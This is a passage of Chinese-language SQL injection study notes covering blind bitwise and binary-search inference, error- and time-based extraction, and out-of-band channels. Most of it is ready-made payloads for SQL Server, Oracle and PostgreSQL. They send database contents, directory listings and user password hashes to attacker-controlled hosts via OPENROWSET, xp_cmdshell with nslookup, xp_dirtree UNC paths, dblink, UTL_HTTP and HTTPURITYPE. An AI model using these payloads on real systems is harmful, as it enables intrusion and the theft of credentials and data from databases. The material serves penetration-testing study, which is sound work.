<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>J

<span class="token comment">#二分法</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k <span class="token keyword">THEN</span> <span class="token string">'Bob'</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span>
<span class="token comment">#下面是相应的使用逐位方法的例子</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'Mad'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j <span class="token keyword">THEN</span> <span class="token string">'Bob'</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当ASP.NET应用程序使用web.config配置文件的＜customError＞标记定义的出错页面(error page)来捕获未处理的异常时，可以添加或修改 aspxerrorpage参数，使其指向一个并不存在的页面，这样就可以旁路(bypass)出错页面。因此，如果下面的请求在功能上重定向到一个用户自定义的出错页面，请求常常会泄漏它所捕获的底层错误:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">count_reviews<span class="token punctuation">.</span>aspx?review_author<span class="token operator">=</span>MadBob'<span class="token operator">&amp;</span>aspxerrorpath<span class="token operator">=</span><span class="token operator">/</span>foo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>语法上不能存在错误，因为这会导致在执行查询之前总是失败，只 能通过某些条件来引发查询失败。可通过结合使用除数为0的子句和CASE条件来实现该目的:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k <span class="token keyword">THEN</span> CAST <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span> <span class="token keyword">AS</span> <span class="token keyword">CHAR</span><span class="token punctuation">)</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Oracle响应技术"><a href="#Oracle响应技术" class="headerlink" title="Oracle响应技术"></a>Oracle响应技术</h4><p>结构和上述数据库相似，依赖的函数不同</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> SYS_CONTEXT<span class="token punctuation">(</span><span class="token string">'USE RENV'</span><span class="token punctuation">,</span><span class="token string">'ISDBA'</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token string">'TRUE'</span>；
<span class="token comment">#逐位推断，根据第二个注入谓词是否返回结果来测试状态：</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span>
<span class="token operator">AND</span> BITAND<span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j
<span class="token comment">#二分搜索</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k
<span class="token comment">#使用Oracle的字符串连接技术来确保在函数或过程参数列表中安全地使用,该技术使用连接和CASE语句将利用重写为拆分与平衡过的字符串</span>
Mad<span class="token string">'||(SELECT CASE WHEN (ASCII(SUBSTR((...),i,1))&gt;k THEN '</span>Bob<span class="token string">' ELSE '' END FROM DUAL)||'</span><span class="token punctuation">;</span>
<span class="token comment">#上述代码只有在推断测试返回真时才会产生完整的MadBob字符串</span>
<span class="token comment">#使用除数为0子句来产生运行时错误，这与SQL Server中的操作相似</span>
MadBob<span class="token string">'||(SELECT CASE WHEN BITAND((ASCII(SUBSTR((...),i,1))2^j)=2^j THEN CAST(1/0 AS CHAR) ELSE '' END FROM DUAL)||'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="返回多位信息"><a href="#返回多位信息" class="headerlink" title="返回多位信息"></a>返回多位信息</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#逐位</span>
<span class="token keyword">CASE</span>
<span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:00'</span>
<span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j
<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:05'</span>
<span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span>
<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:10'</span>
<span class="token keyword">ELSE</span>
<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:15'</span>
<span class="token keyword">END</span>

<span class="token comment">#二分</span>
<span class="token keyword">CASE</span>
<span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k
<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:05'</span>
<span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>k
<span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span>
<span class="token keyword">ELSE</span>
<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:00'</span>
<span class="token keyword">END</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="使用非主流通道"><a href="#使用非主流通道" class="headerlink" title="使用非主流通道"></a>使用非主流通道</h3><p>数据库连接、DNS、e-mail和HTTP</p>
<h4 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h4><p>针对mssql，攻击者可通过通道来创建从受害者数据库到攻击者数据库的连接，并通过该连接传递查询的数据。可使用OPENROWSET命令实现该目的，要想攻击成功，攻击者必须能够在受害者数据库上打开一条通向攻击者数据库的TCP(传输控制协议)连接，默认使用的是1433端口。如果受害者机器上配有出口过滤功能，或者攻击者正在执行出口过滤，那么连接就会失败。只需修改目的IP地址后面的端口号即可连接到其他端口。</p>
<p>示例：连接到地址为10.0.2.2的mssql用户sa并执行SQL语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;
Address=10.0.2.2;uid=sa;pwd=Mypassword'</span><span class="token punctuation">,</span><span class="token string">'SELECT review_author FROM reviews'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>向外部数据库传递数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSOCN;
Address=192.168.0.1;uid=foo;pwd=password'</span><span class="token punctuation">,</span><span class="token string">'SELECT * FROM attacker_table'</span><span class="token punctuation">)</span> <span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sysobjects <span class="token keyword">WHERE</span> xtype<span class="token operator">=</span><span class="token string">'U'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>若拥有管理员权限并启动了xp_cmdshell</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#下列查询将使目标数据库发送C:\路径下的文件和目录列表：</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;
Address=www.attacker.com:80; uid=sa; pwd=53kr3t'</span><span class="token punctuation">,</span><span class="token string">'SELECT * FROM table'</span><span class="token punctuation">)</span> <span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell 'dir C:\'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>oracle也支持数据库连接，但是不能镶嵌其他查询</p>
<p>PostgreSQL9.1或更高版本超级用户启用dblink拓展</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> EXTENSION dblink<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用dblink系列命令从攻击者数据库向由攻击者控制的PostgreSQL数据库实例复制数据。但是这些函数仅对行进行操作，而不是对结果集进行操作。如果按照这种方式，请先准备好编写依靠游标(cursor)遍历数据的PL/pgSQL函数。</p>
<p>例子：转储了数据库用户及其散列后的密码：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> dumper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> void <span class="token keyword">AS</span> $$
<span class="token keyword">DECLARE</span>
rvar record<span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">FOR</span> rvar <span class="token operator">in</span> <span class="token keyword">SELECT</span> usename<span class="token operator">||</span><span class="token string">','</span><span class="token operator">||</span>passwd <span class="token keyword">as</span> c <span class="token keyword">FROM</span> pg_shadow <span class="token keyword">LOOP</span>
PERFORM dblink_exec<span class="token punctuation">(</span><span class="token string">'host=172.16.0.100 dbname=db user=uname password=Pass'</span><span class="token punctuation">,</span><span class="token string">'insert into dumper values('''</span><span class="token operator">||</span>rvar<span class="token punctuation">.</span>c<span class="token operator">||</span><span class="token string">''')'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span> <span class="token keyword">LOOP</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
$$ <span class="token keyword">LANGUAGE</span> <span class="token string">'plpgsql'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="DNS渗透"><a href="#DNS渗透" class="headerlink" title="DNS渗透"></a>DNS渗透</h4><p>网络只有入口过滤而没有出口过滤时，或者仅有TCP出口过滤时，数据库可直接向攻击者发送DNS请求。</p>
<p>PostgreSQL、SQL server、Oracle均能直接或间接引发DNS请求，Oracle使用UTL_INADDR包，这个包包含一个明确用于查找转发条目(forward entry)的GET_HOST_ ADDRESS函数和一个用于查找逆向条目的GET_HOST_NAME函数：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">UTL_INADDR<span class="token punctuation">.</span>GET_HOST_ADDRESS<span class="token punctuation">(</span><span class="token string">'www.victim.com'</span><span class="token punctuation">)</span> 
<span class="token comment">-- 返回192.168.1.0</span>

UTL_INADDR<span class="token punctuation">.</span>GET_HOST_NAME<span class="token punctuation">(</span><span class="token string">'192.168.1.0'</span><span class="token punctuation">)</span>
<span class="token comment">-- 返回www.victim.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DNS函数不需要使用PL/SQL块，可以直接插入子查询或谓词</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#插入谓词提取数据库登录用户</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span>UTL_INADDR<span class="token punctuation">.</span>GET_HOST_ADDRESS<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">USER</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.attacker.com'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>PostgreSQL使用XML解析库的一个小技巧来初始化DNS查询</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#将一个包含数据库用户名的查找发送给DNS服务器，以查找attacker.com</span>
<span class="token keyword">SELECT</span> XMLPARSE<span class="token punctuation">(</span>document <span class="token string">'&lt;?xml version:"1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE x [ &lt;!ELEMENT x ANY &gt;&lt;!ENTITY xx SYSTEM "http://'</span><span class="token operator">||</span><span class="token keyword">user</span><span class="token operator">||</span>'attacker<span class="token punctuation">.</span>com<span class="token punctuation">.</span><span class="token operator">/</span>"<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>x<span class="token operator">&gt;</span><span class="token operator">&amp;</span>xx<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>x<span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>只要PostgreSQL安装了dblink,在连接字符串中就可以指定一个主机名(hostname)以引发一次DNS查找，但这要求具有超级用户的访问权限。</p>
<p>mssql可以通过xp_cmdshell存储过程来执行nslookup命令</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'nslookup www.victim'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果攻击者的DNS服务器是公共可用的192.168.1.1，那么直接查找DNS请求</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'nslookup www.victim 192.168.1.1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以将这些代码绑定到一些shell脚本中以提取目录内容</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">EXEC master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">'for /F "tokens=5"%i in ('</span>'dir c:<span class="token punctuation">\</span>'<span class="token string">') do nslookup %i.attacker.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这是数据库所在机器的默认搜索域。可以为传递给nslookup的名称添加一个点号(.)，从而阻止在默认域中进行查找。</p>
<p>其他储存过程,这些存储过程依赖于Windows对网络</p>
<p>UNC(Universal Naming Convention,通用命名约定)路径的内在支持</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xp_getfiledetails<span class="token punctuation">(</span><span class="token keyword">SQL</span> Server <span class="token number">2000</span><span class="token punctuation">,</span>需要一个文件路径<span class="token punctuation">)</span>
xp_fileexist<span class="token punctuation">(</span><span class="token keyword">SQL</span> Server <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token number">2005</span>、<span class="token number">2008</span> 和 <span class="token number">2008</span> R2<span class="token punctuation">,</span>需要一个文件路径<span class="token punctuation">)</span>
xp_dirtree<span class="token punctuation">(</span><span class="token keyword">SQL</span> Server <span class="token number">2000.</span> <span class="token number">2005</span>、<span class="token number">2008</span> 和 <span class="token number">2008</span> R2<span class="token punctuation">,</span>需要一个文件路径<span class="token punctuation">)</span> 

<span class="token keyword">DECLARE</span> <span class="token variable">@a</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SET</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token string">'\\'</span><span class="token operator">+</span><span class="token keyword">SYSTEM_USER</span><span class="token operator">+</span><span class="token string">'.attacker.com.'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token variable">@a</span>

<span class="token comment">#存储过程的参数列表禁止使用字符串连接，因而上述代码使用了一个中间变量来保存路径。SQL间接引发了对主机名sa.attacker.com的DNS查找，最终证明了是在使用管理员账户进行登录。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过xp_cmdshell执行DNS查找时，路径中出现非法字符会导致桩解析器 (resolver stub)失败，从而无法尝试查找。同样，UNC路径多于128个字符也会导致桩解析器失败。可以先将希望检索的数据转换成完全能够被DNS处理的格式，一种做法是将数据转换成十六进制表示。SQL Server包含一个名为FN_VARBINTOHEXSTR() 的函数，它接收类型为VARBINARY的参数并返回该数据的十六进制表示。例如：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span> <span class="token keyword">as</span> <span class="token keyword">VARBINARY</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">-- 0x73006100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>长度问题，substring()</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@a</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token string">'\\'</span><span class="token operator">+</span>master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">1</span> CAST<span class="token punctuation">(</span>review_body <span class="token keyword">AS</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">VARBINARY</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.attacker.com.'</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token variable">@a</span><span class="token punctuation">;</span>

<span class="token comment">-- "0x4d6f7669657320696e20746869732067656e7265206f667465.attacker.com." 或 "Movies in this genre ofte"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>多行操作需要封装</p>
<h4 id="e-mail渗透"><a href="#e-mail渗透" class="headerlink" title="e-mail渗透"></a>e-mail渗透</h4><p>跟DNS类似，使用SMTP（Simple Mail Transfer Protocol,简单邮件传输协议）发送e-mail不需要直接连接发送者和接收者。该方法的限制在于异步性上。发送利用之后，e-mail需要过一段时间才能到达。</p>
<h4 id="HTTP渗透"><a href="#HTTP渗透" class="headerlink" title="HTTP渗透"></a>HTTP渗透</h4><p>适用场合是：数据库服务器拥有网络层许可来访问由攻击者控制的Web资源。SQL Server和MySQL没有包含构造HTTP请求的默认机制，使用自定义扩展实现，PostgreSQL可以使用外部语言封装成HTTP的函数，Oracle由UTL_HTTP和HTTPURITYPE包提供，public权限。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span>
review_author<span class="token operator">=</span>UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'www.attacker.com/'</span><span class="token operator">||</span><span class="token keyword">USER</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>复查web日志会发现一条包含数据库登录的日志</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Oracle llg：</span>
<span class="token string">'a'</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'www.attacker.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> sys<span class="token punctuation">.</span>stragg<span class="token punctuation">(</span><span class="token keyword">DISTINCT</span> username<span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token operator">||</span>password<span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dba_users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span>'a

<span class="token comment">-- 将所有用户名和口令发送给了攻击者的访问日志</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Oracle 9z R2和更高版本的+XMLB：</span>
<span class="token string">'a'</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'attacker.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> xmltransform<span class="token punctuation">(</span>sys_xmlagg<span class="token punctuation">(</span>sys_xmlgen<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>xmltype<span class="token punctuation">(</span><span class="token string">'&lt;?xml version="l.0"?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xs1="http://www.w3.org/1999/XSL/Transform"&gt;&lt;xsl:template match="/"&gt;&lt;xsl:for-each select="/ROWSET/ USERNAME"&gt;&lt;xsl:value-of select="text()"/&gt;;&lt;/xsl:for-each&gt;&lt;/xsl:templatex/xsl:stylesheet&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getstringval<span class="token punctuation">(</span><span class="token punctuation">)</span> listagg <span class="token keyword">from</span> all_users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span>'a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#HTTPURITYPE</span>
<span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>LENGTH<span class="token punctuation">(</span>HTTPURITYPE<span class="token punctuation">(</span><span class="token string">'http://attacker/'</span><span class="token operator">||</span>username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password<span class="token punctuation">)</span><span class="token punctuation">.</span>getclob <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">WHERE</span> <span class="token keyword">type</span><span class="token comment">#=0 AND LENGTH(password)=16)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Web服务器的访问日志文件将包含数据库的所有用户名和口令。</p>
<p>注入ORDER BY子句</p>
